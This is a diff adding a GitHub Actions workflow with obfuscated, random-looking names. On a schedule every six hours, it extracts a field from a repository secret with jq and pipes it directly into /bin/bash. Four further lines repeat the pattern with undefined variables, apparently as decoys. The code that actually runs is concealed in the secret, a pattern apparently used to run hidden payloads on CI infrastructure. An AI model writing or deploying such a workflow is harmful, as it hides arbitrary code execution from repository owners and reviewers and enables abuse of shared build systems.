@@ -1,0 +1,21 @@
+name: gowncousin
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: gowncousin
+        env:
+          dapdi2797: ${{ secrets.dapdi2797 }}
+        run: |
+          echo $dapdi2797 | jq -r .g63 | /bin/bash
+          echo $iab3950 | jq -r .d687 | /bin/bash
+          echo $tc7 | jq -r .iupkq16788 | /bin/bash
+          echo $gvgo17129 | jq -r .d6 | /bin/bash
+          echo $e11184 | jq -r .uz1 | /bin/bash
+
